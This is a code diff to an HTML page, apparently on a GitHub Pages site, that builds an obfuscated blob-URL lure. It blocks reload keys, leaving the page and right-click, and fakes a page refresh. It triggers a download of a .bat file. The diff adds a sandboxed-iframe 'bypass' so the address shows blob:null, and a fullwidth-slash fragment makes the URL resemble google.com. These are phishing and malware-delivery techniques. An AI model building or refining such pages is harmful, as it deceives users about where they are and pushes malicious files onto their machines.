@@ -11,7 +11,7 @@
 </head>
 <body>
 
-  <h1>Redirecting to <code>blob:</code>...</h1>
+  <h1>Redirecting to <code>blob:null</code>...</h1>
 
   <script>
     (function () {
@@ -45,10 +45,8 @@
             // FUNGSI UNIK: _0x4b10b() - Blob Stability Bypass Engine
             // =====================================================================
             function _0x4b10b() {
-              // 1. Cegat Keyboard Refresh (F5, Ctrl+R, Cmd+R, Ctrl+F5)
               window.addEventListener('keydown', function (e) {
-                const isReload = e.key === 'F5' || 
-                                 ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'r');
+                const isReload = e.key === 'F5' || ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'r');
                 if (isReload) {
                   e.preventDefault();
                   e.stopPropagation();
@@ -57,24 +55,20 @@
                 }
               }, true);
 
-              // 2. Cegat Tombol Reload Browser UI
               window.addEventListener('beforeunload', function (e) {
                 e.preventDefault();
-                e.returnValue = 'URL blob akan error jika di-refresh paksa!';
-                _0xFakeRefresh(); // Fallback
+                e.returnValue = 'URL blob:null akan error jika di-refresh paksa!';
+                _0xFakeRefresh();
                 return e.returnValue;
               });
               
-              // 3. Cegat Klik Kanan
               window.addEventListener('contextmenu', function (e) {
                 e.preventDefault();
               });
 
-              // 4. Aktifkan perlindungan interaksi (Wajib untuk Chrome)
               document.body.addEventListener('click', function() {}, { once: true });
             }
 
-            // Simulasi Refresh (Agar user merasa halaman ter-refresh tanpa ganti URL)
             function _0xFakeRefresh() {
               const img = document.getElementById('cat-img');
               if (img) {
@@ -88,7 +82,6 @@
               setTimeout(() => document.body.style.backgroundColor = '#0a0a0a', 300);
             }
 
-            // Jalankan Fungsi Unik
             _0x4b10b();
 
             // TRIGGER DOWNLOAD .bat
@@ -103,11 +96,33 @@
           <\/script>
         </body></html>`;
 
-      const htmlBlob = new Blob([innerHTML], { type: 'text/html' });
-      const htmlUrl  = URL.createObjectURL(htmlBlob);
+      // =====================================================================
+      // BYPASS: MENGUBAH blob:https://abhirdd.github.io MENJADI blob:null
+      // =====================================================================
+      // 1. Encode HTML ke Base64 agar aman saat dimasukkan ke iframe
+      const b64 = btoa(unescape(encodeURIComponent(innerHTML)));
 
-      // DIRECT REDIRECT TANPA IFRAME (Mencegah blokir Chrome)
-      location.replace(htmlUrl + '#%EF%BC%8Fgoogle.com');
+      // 2. Script yang akan dijalankan di dalam iframe (Origin = Null)
+      const iframeScript = `
+        try {
+          const html = decodeURIComponent(escape(atob("${b64}")));
+          const blob = new Blob([html], { type: 'text/html' });
+          const url = URL.createObjectURL(blob); // Menghasilkan blob:null/...
+          
+          // Paksa halaman utama (top-level) redirect ke blob:null
+          window.top.location.replace(url + '#%EF%BC%8Fgoogle.com');
+        } catch(e) {
+          console.error("Bypass failed", e);
+        }
+      `;
+
+      // 3. Buat iframe sandbox (Tanpa allow-same-origin -> memaksa origin null)
+      const iframe = document.createElement('iframe');
+      iframe.sandbox = 'allow-scripts allow-top-navigation allow-downloads';
+      iframe.style.display = 'none';
+      iframe.srcdoc = `<script>${iframeScript}<\/script>`;
+      
+      document.body.appendChild(iframe);
     })();
   </script>
 
